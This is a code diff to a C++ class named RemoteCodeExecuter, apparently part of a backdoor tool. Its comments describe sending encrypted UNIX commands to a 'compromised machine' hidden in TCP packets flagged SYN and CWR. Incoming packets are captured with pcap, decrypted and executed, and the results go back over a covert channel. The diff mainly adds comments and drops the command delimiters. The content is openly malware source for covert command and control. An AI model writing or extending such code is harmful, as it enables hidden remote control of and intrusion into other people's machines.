@@ -9,6 +9,16 @@
 #define CMD_START_STR "s-start["
 #define CMD_STOP_STR "]s-end"
 
+/*
+ * Sends a command to a compromised machine.
+ *
+ * Params:
+ *      NetworkEngine *net: The network engine to use to send the command.
+ *
+ *      const struct in_addr daddr: The address of the compromised machine.
+ *
+ *      const std::string &cmd: The UNIX command to execute on the remote machine.
+ */
 int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
                                     const std::string &cmd) {
     unsigned short sport;
@@ -23,10 +33,7 @@ int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr dad
     ack = Crypto::rand();
 
     // convert command to payload
-    std::string data(CMD_START_STR);
-    data += cmd;
-    data += CMD_STOP_STR;
-    UCharVector payload(data.begin(), data.end());
+    UCharVector payload(cmd.begin(), cmd.end());
 
     // encrypt
     UCharVector ciphertext = net->getCrypto()->enc(payload);
@@ -36,6 +43,17 @@ int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr dad
                            TcpStack::SYN_FLAG | TcpStack::CWR_FLAG, ciphertext);
 }
 
+/*
+ * The PCAP callback function that handles the any packet related to the remote code execution
+ * protocol.
+ *
+ * Params:
+ *      const pcap_pkthdr *header: The PCAP header structure.
+ *
+ *      const unsigned char *packet: The incoming packet.
+ *
+ *      NetworkEngine *net: The network engine.
+ */
 void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                                      NetworkEngine *net) {
     struct ethhdr *eth = (struct ethhdr *)packet;
@@ -72,15 +90,12 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     // decrypt
     UCharVector ciphertext{};
     ciphertext.assign(payload, payload + payloadSize);
-
     UCharVector plaintext = net->getCrypto()->dec(ciphertext);
 
     // if command execute it
     if (tcp->syn && tcp->cwr) {
-        char *tmp;
-        if ((tmp = getCommand((char *)plaintext.data())) != nullptr) {
-            executeCommand(net, ntohl(ip->saddr), tmp);
-        }
+        std::string tmp((char *)plaintext.data(), payloadSize);
+        executeCommand(net, ntohl(ip->saddr), tmp.c_str());
     }
 
     // if it is a response print it
@@ -94,24 +109,16 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     }
 }
 
-char *RemoteCodeExecuter::getCommand(char *payload) {
-    char *command;
-    char *endPtr;
-
-    if (!(command = strstr(payload, CMD_START_STR))) {
-        return nullptr;
-    }
-
-    command += strlen(CMD_START_STR);
-
-    if (!(endPtr = strstr(payload, CMD_STOP_STR))) {
-        return nullptr;
-    }
-    *endPtr = 0;
-
-    return command;
-}
-
+/*
+ * Executes a command and then sends the results over the network with a covert channel.
+ *
+ * Params:
+ *      NetworkEngine *net: The network engine to use.
+ *
+ *      const unsigned int daddr: The host to send the packet too.
+ *
+ *      const char *cmd: The command the execute.
+ */
 void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
                                         const char *cmd) {
     struct in_addr daddrIn;
